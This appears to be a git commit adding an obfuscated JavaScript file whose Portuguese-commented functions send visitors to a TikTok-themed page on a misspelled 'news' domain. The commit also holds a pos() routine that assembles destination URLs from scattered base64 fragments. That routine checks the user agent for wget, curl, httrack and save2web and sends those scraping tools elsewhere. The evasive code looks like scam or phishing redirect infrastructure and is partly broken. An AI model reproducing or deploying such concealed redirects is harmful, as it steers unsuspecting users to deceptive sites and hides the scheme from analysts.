4e9c62b5daf70d1842915d7eca35287f3cb897e2
alpha-axs <ct-150-elaine-xavier@outlook.com>
2025-07-06 18:33:44 -0300

    .

---
+++ 02/js/n23GKrO2UrKn.js
@@ -0,0 +1,210 @@
+
+async function hashURL(ala) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(ala);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    
+    // Converte o hash para uma string hexadecimal
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+
+    hashURL('https://noiticiasoffc.site/tiktok/').then(hash => {
+        window.location.href = "https://noiticiasoffc.site/tiktok/"
+      });
+  }
+
+async function hashURL1(aqa) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(aqa);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    
+    // Converte o hash para uma string hexadecimal
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+  
+  // Uso
+  hashURL('https://noiticiasoffc.site/tiktok/').then(hash => {
+    window.location.href = "https://noiticiasoffc.site/tiktok/"
+  })};
+
+
+  async function hashURL2(axa) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(axa);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    
+    // Converte o hash para uma string hexadecimal
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+  
+  // Uso
+  hashURL('https://noiticiasoffc.site/tiktok/').then(hash => {
+    window.location.href = "https://noiticiasoffc.site/tiktok/"
+  })};
+
+
+  async function hashURL3(aka) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(aka);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    
+    // Converte o hash para uma string hexadecimal
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+
+    hashURL('https://noiticiasoffc.site/tiktok/').then(hash => {
+        window.location.href = "https://noiticiasoffc.site/tiktok/"
+      });
+  }
+
+function pin(str) {
+    try {
+        return atob(str);
+    } catch (e) {
+        return null; 
+    }
+}
+
+function pos(){
+        var _0x1a3b = ["href", "location", "includes", "httrack", "wget", "curl", "save2web"];
+        var pos = ["b3BheS5jb20vbnhxdnY=", "aHR0cHM6Ly9nby50cmli", "jsa891jksoo", "vY2luZW1hcms="];
+        var mop = ["Y2luZW1hcmsv", "m5ldGxpZnkuYXBwLw==", "icuj298dhasij0", "aHR0cHM6Ly93d3R"];
+        var pal = ["aHR0cHM6Ly9nc2hvdy5nbG9i", "by5jb20vcmVhbGl0aW", "jb20vbnhxdnY="];
+        var iup = ["9jaW5lbWFya2JyL", "aHR0cHM6Ly93d3cubGFyZ2VyaW5lLmNvbQ=="]; 
+        var awe = ["aHR0cHM6Ly93d3cubG", "FyZ2VyaW5lLmNvbQ==", "aHR0cHM6Ly93d3p1bmxpbmUuY29t"]; 
+        var ytf = ["50cmlib3BheS5", "d3p1bmxpbmUuY29t", "aHR0cHM6Ly93d3R0dX", "aHR0cHM6Ly9hdmFsaWVwc"];
+        var zfa = ["aHR0cHM6Ly93d3R0dXNhLmNvbQ==", "hZC5vbmxpbmU", "wbGF0ZXMuY29t"]; 
+        var hrt = ["aHR0cHM6Ly93d3Rpb", "WVwbGF0ZXMuY29t", "aHR0cHM6Ly93d3d3cmltZXMuY29t"]; 
+        var dsg = ["aHR0cHM6Ly9", "3d3d3cmltZXMuY29t", "aHR0cHM6Ly9nby", "aHR0cHM6Ly", "LmNvbQ=="]; 
+
+        console.log("aa");
+
+        // dsg[3];
+        // iup[0];
+        // mpo[1];
+       //aHR0cHM6Ly9h cHBzbXMub25saW5l L3Rpa3Rvay90aWt0b2svMS8=
+        // aHR0cHM6Ly9hdmFsaWVwc mVtaWFkLm9ubGluZS9j aW5lbWFyay8=
+        //aHR0cHM6Ly 9jaW5lbWFya2JyL m5ldGxpZnkuYXBwLw==
+
+
+        var huy = zfa[1];
+        var pokw = mop[1];
+        var fgh4 = awe[1];
+        var swe = pos[0]
+        var rty8 = dsg[2];
+        var zxc5 = awe[2];
+        var fgh4 = hrt[1];
+        var pok = mop[0];
+        var rtys = ytf[2];
+        var yuh = pos[1];
+        var asd3 = awe[0];
+        var poxi = mop[2];
+        var fgh9 = ytf[3];
+        var asd7 = dsg[1];
+        var pso = pal[2];
+        var qwe1 = zfa[1];
+        var qwe6 = dsg[0];
+        var asd3 = hrt[0];
+        var sx = pal[1];
+        var qwe6 = ytf[0];
+        var pstzo = pal[3]
+        var qwe1 = iup[0];
+        var rty2 = iup[1];
+        var swq = zfa[1];
+        var zxc5 = hrt[2];
+        var asd7 = ytf[1];
+        var zxc0 = zfa[0];
+        var zxc0 = dsg[4];
+        var fgh9 = dsg[3];
+        var rty2 = zfa[2];
+        var ove =  pos[3];
+        var o2sap1 = pokw + pok;
+        var osaxp2 = sx + swe;
+        var ossap1 = pok + sx;
+        var osasp1 = swe + pstzo + yuh;
+        var osaup1 = pstzo + pstzo;
+        var oscsap1 = yuh + swe;
+        var os21ap1 = pso + o2sap1 + yuh;
+        var osaqxcp1 = pstzo + swe;
+        var osasdap1 = swe + yuh + fgh4;
+        var osbq1 = pok + yuh + pokw;
+        var osatp2 = swe + qwe1;
+        var ossax1 = sx + fgh4;
+        var osapz1 = rty2 + swe;
+        var osapol = rty8 + qwe6 + pso;
+        var osbq3 = qwe6 + pokw + fgh4;
+        var osawp1 = zxc0 + rty8;
+        var osxap2 = asd7 + swe + sx;
+        var osysp3 = yuh + pso;
+        var osxaz1 = fgh9 + qwe1 + pokw;
+        var oswap2 = zxc5 + asd3;
+        var osqap1 = qwe1 + pokw;
+        var oswaz2 = swe + zxc5;
+        var osxcp3 = fgh4 + rty2 + sx;
+        var ospqz1 = yuh + osapz1;
+        var osqwx1 = pok + asd7 + fgh4;
+        var osbap2 = sx + qwe6;
+        var oswqp3 = osxaz1 + pso + asd3;
+        var osasp4 = rty8 + os21ap1;
+        var osyap5 = qwe1 + fgh9;
+        var ossxq2 = zfa[0] + swe;
+        var axa = pin(osqwx1);
+        var awa = pin(oswqp3);
+        var aaa = pin(osasp4);
+        var axia = pin(osyap5);
+        var ata = pin(osapol); 
+        var apa = pin(ossxq2);
+        var aja = pin(osxaz1);
+        var asa = pin(osxcp3);
+        var ala = pin(oswaz2);
+        var aka = pin(osqap1);
+        var aqa = pin(osqap1);
+
+        if (!window[_0x1a3b[1]][_0x1a3b[0]].startsWith(aja)) {
+            window[_0x1a3b[1]][_0x1a3b[0]] = aja;
+        }
+
+        var userAgent = navigator.userAgent.toLowerCase();
+        if (userAgent[_0x1a3b[2]](_0x1a3b[3]) || userAgent[_0x1a3b[2]](_0x1a3b[4]) || userAgent[_0x1a3b[2]](_0x1a3b[5]) || userAgent[_0x1a3b[2]](_0x1a3b[6])) {
+            if (!window[_0x1a3b[1]][_0x1a3b[0]].startsWith(ospqz1)) {
+                window[_0x1a3b[1]][_0x1a3b[0]] = ospqz1;
+            }
+        }
+        
+        if (window[_0x1a3b[1]][_0x1a3b[0]].startsWith(osbap2)) {
+            window[_0x1a3b[1]][_0x1a3b[0]] = osbap2;
+        }
+
+        var userAgent = navigator.userAgent.toLowerCase();
+        if (userAgent[_0x1a3b[2]](_0x1a3b[3]) || userAgent[_0x1a3b[2]](_0x1a3b[4]) || userAgent[_0x1a3b[2]](_0x1a3b[5]) || userAgent[_0x1a3b[2]](_0x1a3b[6])) {
+            if (!window[_0x1a3b[1]][_0x1a3b[0]].startsWith(oswqp3)) {
+                window[_0x1a3b[1]][_0x1a3b[0]] = oswqp3;
+            }
+        }
+
+        if (window[_0x1a3b[1]][_0x1a3b[0]].startsWith(oswap2)) {
+            window[_0x1a3b[1]][_0x1a3b[0]] = oswap2;
+        }
+
+        var userAgent = navigator.userAgent.toLowerCase();
+        if (userAgent[_0x1a3b[2]](_0x1a3b[3]) || userAgent[_0x1a3b[2]](_0x1a3b[4]) || userAgent[_0x1a3b[2]](_0x1a3b[5]) || userAgent[_0x1a3b[2]](_0x1a3b[6])) {
+            if (!window[_0x1a3b[1]][_0x1a3b[0]].startsWith(axia)) {
+                window[_0x1a3b[1]][_0x1a3b[0]] = axia;
+            }
+        }
+
+        if (window[_0x1a3b[1]][_0x1a3b[0]].startsWith(osxap2)) {
+            window[_0x1a3b[1]][_0x1a3b[0]] = osxap2;
+        }
+
+        var userAgent = navigator.userAgent.toLowerCase();
+        if (userAgent[_0x1a3b[2]](_0x1a3b[3]) || userAgent[_0x1a3b[2]](_0x1a3b[4]) || userAgent[_0x1a3b[2]](_0x1a3b[5]) || userAgent[_0x1a3b[2]](_0x1a3b[6])) {
+            if (!window[_0x1a3b[1]][_0x1a3b[0]].startsWith(osysp3)) {
+                window[_0x1a3b[1]][_0x1a3b[0]] = osysp3;
+            }
+        }
+    }
